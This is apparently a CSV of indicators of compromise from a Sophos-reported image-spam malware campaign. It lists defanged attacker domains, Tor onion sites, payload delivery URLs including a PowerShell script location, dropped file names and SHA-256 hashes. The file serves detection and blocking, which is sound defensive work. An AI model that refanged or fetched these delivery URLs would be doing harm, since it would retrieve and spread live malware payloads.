Indicator_type,Data,Note,
Description,https://news.sophos.com/en-us/2023/08/10/image-spam-attack,IOCs from this incident,
domain,aircourier-company[.]com,Conventional website used by the threat actor,
domain,safedelivery-company[.]com,Conventional website used by the threat actor,
domain,exmb25nic6n25sclnf44rrgynquns7u3zjqa33x3uztwbmsuptf7gyid[.]onion,Tor (dark web) website used by the threat actor,
domain,um2kc2ahigbq7t2rchk3tnxnjzvrddbhxkcy573dqxci44wvi4ge5cad[.]onion,Tor (dark web) website used by the threat actor,
domain,fq5rdcppmv7cqjhretm3owbnj4hskcv37bcgx5rpbdbhqfefzix4tiyd[.]onion,Tor (dark web) website used by the threat actor,
domain,xaoqohhckbb3pnxtyqzj6pkuzckt2urbeiyd5xlanmw52expmohl7dyd[.]onion,Tor (dark web) website used by the threat actor,
domain,3emyw4wto7tgupbisnbdbkbyaamb7p7dpxp6lnfqwyemskmmar3fugad[.]onion,Tor (dark web) website used by the threat actor,
domain,carpoollk[.]com,Conventional website used by the threat actor,
url,hxxps://carpoollk[.]com/se/maind.ps1,Payload delivery URL,
url,hxxps://aircourier-company[.]com/index/tracking_pack_ch_4254qj6405mo601615yxq41298?next=1,Payload delivery URL,
url,hxxps://safedelivery-company[.]com/manager/tracking_pack_ch_4254qj6405mo601615yxq41298,Payload delivery URL,
filename,sendung_N03012_16092022.com,initial payload name,
filename,SECURE DELIVERY SERVICE.EXE,dropped executable found in %temp%,
sha256,44ccf669eec9f9b9695e0eb255b729df14f63485d85faf5375b5e7efb35a9d3e,ms.ps1 script,
sha256,8ebcc0d9a7883d6526aad38492aa6f2d2192a817591aeb4b971cb2ba3d447ef0,modified LICENSE file with appended base64,
sha256,3ba53f06b81005d0da9dc2e83feb4dd983884ef5533fcec2e8e3772e1ee1a615,Decoded first-level output of LICENSE base64,NOT on VT
sha256,2700054554608a0a1d53fd65067b19d3a1dc0297d6bcfcc4292eec37cde07c18,Decoded second-level output from LICENSE script 1,NOT on VT
sha256,bef6a0755ac4a42697f45843562cc7ce7d1454a85bddc458d2cd99658cf57b71,Decoded second-level output from LICENSE script 2,NOT on VT
sha256,c7c9b1373af60159fe65915116a961be0e74c3719c2f482c91ca88dd738bff78,Decoded second-level output from LICENSE script 3,NOT on VT
sha256,d339ce37d632cee2d457c21b8dbe04fe69930cde0cea13a96593403130abdb54,Installer found on VT that may be the original source,
